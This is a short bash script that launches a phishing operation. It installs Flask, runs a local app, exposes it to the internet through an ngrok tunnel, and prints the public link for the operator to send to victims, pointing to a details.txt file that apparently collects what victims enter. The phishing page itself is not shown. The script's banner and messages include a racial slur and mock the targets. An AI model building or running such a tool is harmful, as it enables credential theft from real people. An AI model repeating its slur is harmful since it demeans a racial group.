#!/bin/bash

# Display banner
sudo apt-get install -y cowsay toilet jq > /dev/null 2>&1
toilet -f mono12 -F gay "PHISHING"
echo ""
echo "Let's catch some brainless niggas "
echo " "
# Install dependencies
sudo apt-get install -y python3 > /dev/null 2>&1
pip install flask > /dev/null 2>&1

# Start the Flask server on port 5000 in the background
export FLASK_APP=your_flask_app.py
export FLASK_ENV=development
FLASK_APP=app.py flask run --host=0.0.0.0 --port=5000 > /dev/null 2>&1 &

# Wait for Flask to initialize
echo "Starting Flask server..."
sleep 5
echo "Grinding ur pc ass..."
sleep 3
# Check if Flask is running
if ! curl -s http://localhost:5000 > /dev/null; then
    echo "Error: Flask server failed to start."
    exit 1
fi

# Start ngrok on port 5000
echo "Starting ngrok..."
ngrok http 5000 > /dev/null 2>&1 &

touch flask_output.log ngrok_output.log
# Wait for ngrok to initialize
sleep 5

# Fetch the ngrok URL
NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')

# Check if ngrok URL is fetched
if [[ -z "$NGROK_URL" || "$NGROK_URL" == "null" ]]; then
    echo "Error: Failed to retrieve ngrok URL. Check if ngrok is running."
    exit 1
fi
echo ""
# Display the ngrok URL
cowsay "GO COPY PASTE THE LINK :"
echo " "
echo " "
echo "Ngrok URL: $NGROK_URL"
echo ""
echo "go check the details.txt file in the given dir"


